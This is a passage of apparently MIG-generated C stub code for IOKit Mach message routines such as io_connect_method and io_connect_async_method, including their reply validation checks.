	InP->from_task.name = from_task;
	InP->from_task.disposition = 19;
	InP->from_task.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->memory_type = memory_type;

	InP->address = address;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2864;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2864, "io_connect_unmap_memory_from_task")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2864, "io_connect_unmap_memory_from_task")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined)
	check_result = __MIG_check__Reply__io_connect_unmap_memory_from_task_t((__Reply__io_connect_unmap_memory_from_task_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_unmap_memory_from_task_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_method_t__defined)
#define __MIG_check__Reply__io_connect_method_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_method_t(__Reply__io_connect_method_t *Out0P, __Reply__io_connect_method_t **Out1PP, __Reply__io_connect_method_t **Out2PP)
{

	typedef __Reply__io_connect_method_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 2965) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = _WALIGN_(Out0P->inband_outputCnt);
#if	__MigTypeCheck
	if ( Out0P->inband_outputCnt > 4096 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224))< Out0P->inband_outputCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224) + _WALIGN_(Out0P->inband_outputCnt)))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 4096);

	msgh_size_delta = Out1P->scalar_outputCnt * 8;
#if	__MigTypeCheck
	if ( Out1P->scalar_outputCnt > 16 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224)) / 8< Out1P->scalar_outputCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 4224) + Out1P->scalar_outputCnt * 8))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_method_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_method */
mig_external kern_return_t io_connect_method
(
	mach_port_t connection,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	mach_vm_address_t ool_output,
	mach_vm_size_t *ool_output_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
		mach_vm_address_t ool_output;
		mach_vm_size_t ool_output_size;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_connect_method_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_method_t__defined */

	__DeclareSendRpc(2865, "io_connect_method")

	InP->NDR = NDR_record;

	InP->selector = selector;

	if (scalar_inputCnt > 16) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->scalar_input, (const char *) scalar_input, 8 * scalar_inputCnt);

	InP->scalar_inputCnt = scalar_inputCnt;

	msgh_size_delta = (8 * scalar_inputCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4224) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (inband_inputCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->inband_input, (const char *) inband_input, inband_inputCnt);

	InP->inband_inputCnt = inband_inputCnt;

	msgh_size_delta = _WALIGN_(inband_inputCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4096);

	InP->ool_input = ool_input;

	InP->ool_input_size = ool_input_size;

	if (*inband_outputCnt < 4096)
		InP->inband_outputCnt = *inband_outputCnt;
	else
		InP->inband_outputCnt = 4096;

	if (*scalar_outputCnt < 16)
		InP->scalar_outputCnt = *scalar_outputCnt;
	else
		InP->scalar_outputCnt = 16;

	InP->ool_output = ool_output;

	InP->ool_output_size = *ool_output_size;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2865;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2865, "io_connect_method")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2865, "io_connect_method")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_method_t__defined)
	check_result = __MIG_check__Reply__io_connect_method_t((__Reply__io_connect_method_t *)Out0P, (__Reply__io_connect_method_t **)&Out1P, (__Reply__io_connect_method_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_method_t__defined) */

	if (Out0P->inband_outputCnt > *inband_outputCnt) {
		(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output,  *inband_outputCnt);
		*inband_outputCnt = Out0P->inband_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output, Out0P->inband_outputCnt);

	*inband_outputCnt = Out0P->inband_outputCnt;

	if (Out1P->scalar_outputCnt > *scalar_outputCnt) {
		(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 *  *scalar_outputCnt);
		*scalar_outputCnt = Out1P->scalar_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 * Out1P->scalar_outputCnt);

	*scalar_outputCnt = Out1P->scalar_outputCnt;

	*ool_output_size = Out2P->ool_output_size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_async_method_t__defined)
#define __MIG_check__Reply__io_connect_async_method_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_async_method_t(__Reply__io_connect_async_method_t *Out0P, __Reply__io_connect_async_method_t **Out1PP, __Reply__io_connect_async_method_t **Out2PP)
{

	typedef __Reply__io_connect_async_method_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 2966) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = _WALIGN_(Out0P->inband_outputCnt);
#if	__MigTypeCheck
	if ( Out0P->inband_outputCnt > 4096 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224))< Out0P->inband_outputCnt) ||
	    (msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 4224) + _WALIGN_(Out0P->inband_outputCnt)))
		{ return MIG_TYPE_ERROR ; }
	msgh_size -= msgh_size_delta;
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 4096);

	msgh_size_delta = Out1P->scalar_outputCnt * 8;
#if	__MigTypeCheck
	if ( Out1P->scalar_outputCnt > 16 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 4224)) / 8< Out1P->scalar_outputCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 4224) + Out1P->scalar_outputCnt * 8))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out2PP = Out2P = (__Reply *) ((pointer_t) Out1P + msgh_size_delta - 128);

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_async_method_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_async_method */
mig_external kern_return_t io_connect_async_method
(
	mach_port_t connection,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	mach_vm_address_t ool_output,
	mach_vm_size_t *ool_output_size
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t referenceCnt;
		io_user_reference_t reference[8];
		uint32_t selector;
		mach_msg_type_number_t scalar_inputCnt;
		io_user_scalar_t scalar_input[16];
		mach_msg_type_number_t inband_inputCnt;
		char inband_input[4096];
		mach_vm_address_t ool_input;
		mach_vm_size_t ool_input_size;
		mach_msg_type_number_t inband_outputCnt;
		mach_msg_type_number_t scalar_outputCnt;
		mach_vm_address_t ool_output;
		mach_vm_size_t ool_output_size;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t inband_outputCnt;
		char inband_output[4096];
		mach_msg_type_number_t scalar_outputCnt;
		io_user_scalar_t scalar_output[16];
		mach_vm_size_t ool_output_size;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;
	Reply *Out2P = NULL;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_connect_async_method_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_async_method_t__defined */

	__DeclareSendRpc(2866, "io_connect_async_method")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t wake_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->wake_port = wake_portTemplate;
	InP->wake_port.name = wake_port;
#else	/* UseStaticTemplates */
	InP->wake_port.name = wake_port;
	InP->wake_port.disposition = 20;
	InP->wake_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	if (referenceCnt > 8) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->reference, (const char *) reference, 8 * referenceCnt);

	InP->referenceCnt = referenceCnt;

	msgh_size_delta = (8 * referenceCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4288) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 64);

	InP->selector = selector;

	if (scalar_inputCnt > 16) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->scalar_input, (const char *) scalar_input, 8 * scalar_inputCnt);

	InP->scalar_inputCnt = scalar_inputCnt;

	msgh_size_delta = (8 * scalar_inputCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	if (inband_inputCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->inband_input, (const char *) inband_input, inband_inputCnt);

	InP->inband_inputCnt = inband_inputCnt;

	msgh_size_delta = _WALIGN_(inband_inputCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 4096);

	InP->ool_input = ool_input;

	InP->ool_input_size = ool_input_size;

	if (*inband_outputCnt < 4096)
		InP->inband_outputCnt = *inband_outputCnt;
	else
		InP->inband_outputCnt = 4096;

	if (*scalar_outputCnt < 16)
		InP->scalar_outputCnt = *scalar_outputCnt;
	else
		InP->scalar_outputCnt = 16;

	InP->ool_output = ool_output;

	InP->ool_output_size = *ool_output_size;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2866;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2866, "io_connect_async_method")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2866, "io_connect_async_method")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_async_method_t__defined)
	check_result = __MIG_check__Reply__io_connect_async_method_t((__Reply__io_connect_async_method_t *)Out0P, (__Reply__io_connect_async_method_t **)&Out1P, (__Reply__io_connect_async_method_t **)&Out2P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_async_method_t__defined) */

	if (Out0P->inband_outputCnt > *inband_outputCnt) {
		(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output,  *inband_outputCnt);
		*inband_outputCnt = Out0P->inband_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) inband_output, (const char *) Out0P->inband_output, Out0P->inband_outputCnt);

	*inband_outputCnt = Out0P->inband_outputCnt;

	if (Out1P->scalar_outputCnt > *scalar_outputCnt) {
		(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 *  *scalar_outputCnt);
		*scalar_outputCnt = Out1P->scalar_outputCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) scalar_output, (const char *) Out1P->scalar_output, 8 * Out1P->scalar_outputCnt);

	*scalar_outputCnt = Out1P->scalar_outputCnt;

	*ool_output_size = Out2P->ool_output_size;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_set_notification_port_t__defined)
#define __MIG_check__Reply__io_connect_set_notification_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_set_notification_port_t(__Reply__io_connect_set_notification_port_t *Out0P)
{

	typedef __Reply__io_connect_set_notification_port_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2967) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_connect_set_notification_port_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_set_notification_port */
mig_external kern_return_t io_connect_set_notification_port
(
	mach_port_t connection,
	uint32_t notification_type,
	mach_port_t port,
	io_user_reference_t reference
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		uint32_t notification_type;
		io_user_reference_t reference;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_set_notification_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_set_notification_port_t__defined */

	__DeclareSendRpc(2867, "io_connect_set_notification_port")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->port = portTemplate;
	InP->port.name = port;
#else	/* UseStaticTemplates */
	InP->port.name = port;
	InP->port.disposition = 20;
	InP->port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->notification_type = notification_type;

	InP->reference = reference;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2867;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2867, "io_connect_set_notification_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2867, "io_connect_set_notification_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_set_notification_port_t__defined)
	check_result = __MIG_check__Reply__io_connect_set_notification_port_t((__Reply__io_connect_set_notification_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_set_notification_port_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_add_notification_t__defined)
#define __MIG_check__Reply__io_service_add_notification_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_add_notification_t(__Reply__io_service_add_notification_t *Out0P)
{

	typedef __Reply__io_service_add_notification_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2968) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->notification.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->notification.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_add_notification_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_add_notification */
mig_external kern_return_t io_service_add_notification
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_string_t matching,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t wake_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t notification_typeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t notification_typeCnt;
		char notification_type[128];
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
